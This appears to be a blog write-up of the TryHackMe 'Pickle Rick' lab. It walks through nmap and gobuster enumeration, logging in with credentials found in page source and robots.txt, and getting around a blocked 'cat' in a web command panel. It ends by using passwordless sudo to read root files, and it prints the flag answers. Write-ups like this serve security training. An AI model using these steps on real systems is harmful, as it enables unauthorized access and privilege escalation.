---
title: TryHackMe - Pickle Rick
description: My writeup on Pickle Rick box.
categories:
 - tryhackme
tags: tryhackme tac gobuster filter php sudo
---

![](https://i.imgur.com/851RMUk.png)

## Box Stats

| Box Info      | Details       |
| ------------- |:-------------:|
| Box Name :    | **Pickle Rick**  |
| Difficulty :  | **Easy**             |
| Play :    | [Pickle Rick](https://tryhackme.com/room/picklerick){:target="_blank"}      |
| Recommended : | Yes :heavy_check_mark:      |

## Summary

Happy new year everyone! First writeup of the year, an easy box that we have to bypass a simple filter so we can read files. Let's start!

## Enumeration/Reconnaissance

Now as always let’s continue with a nmap scan.

```
$ ip=10.10.200.154
$ nmap -sC -sV -oN nmap/picklerick.thm $ip
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-02 19:59 EET
Nmap scan report for 10.10.200.154 (10.10.200.154)
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 21:c1:3b:8c:51:40:61:bc:87:00:75:e6:31:85:1c:40 (RSA)
|   256 44:78:2f:5e:8b:d6:61:1f:d2:f3:31:bb:7c:a8:01:8b (ECDSA)
|_  256 53:e2:38:b6:83:25:7a:ae:47:3e:05:84:e9:5c:5c:10 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
```

Once we visit the website we can see a message that tells us to login into his computer and search for the last three secret ingredients for his pickle-reverse potion. Alright, checking the source code i found a username let's note it down `R1ckRul3s`:

```
$ curl -s http://$ip/               

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

Let's fire up a `gobuster` scan now.

```
$ gobuster dir -q -u http://$ip/ -w $medium -x php,txt,html,js -o scans/gobuster.txt  
/index.html (Status: 200)
/login.php (Status: 200)
/assets (Status: 301)
/portal.php (Status: 302)
/robots.txt (Status: 200)
```

We have a login page awesome, checking the robots.txt i noticed a weird text message tried as password & i got in! `R1ckRul3:Wubbalubbadubdub`

Now we have access to a command panel and we can execute system commands:

![](https://i.imgur.com/wCVazqw.png)

## What is the first ingredient Rick needs?

Running `ls` we can see a file named `Sup3rS3cretPickl3Ingred.txt` we can read it from browser since it's under `/var/www/html`

```
$ curl -s http://$ip/Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair
```

## Whats the second ingredient Rick needs?

Searching around, i found under `/home/rick` the second ingredient. I tried to used `cat` on it but i got an error:

![](https://i.imgur.com/hnpQ8vr.png)

We can't use `cat` its disabled, but we can use lot of other methods. Like `nl` - `less` - `tac`

```
$ tac /home/rick/second\ ingredients
1 jerry tear
```

## Whats the final ingredient Rick needs?

Checking around for privesc, `sudo -l` says we can run all commands without entering a password.

```
Matching Defaults entries for www-data on ip-10-10-200-154.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-200-154.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

So let's read the final ingredient.

```
$ sudo ls /root
3rd.txt
snap

$ sudo tac /root/3rd.txt
3rd ingredients: fleeb juice
```

## Thank You

Thank you for taking the time to read my writeup. If you don't understand something from the writeup or want to ask me something feel free to contact me through discord(0xatom#8707) or send me a message through twitter [0xatom](https://twitter.com/0xatom){:target="_blank"}

Until next time keep pwning hard! :fire:
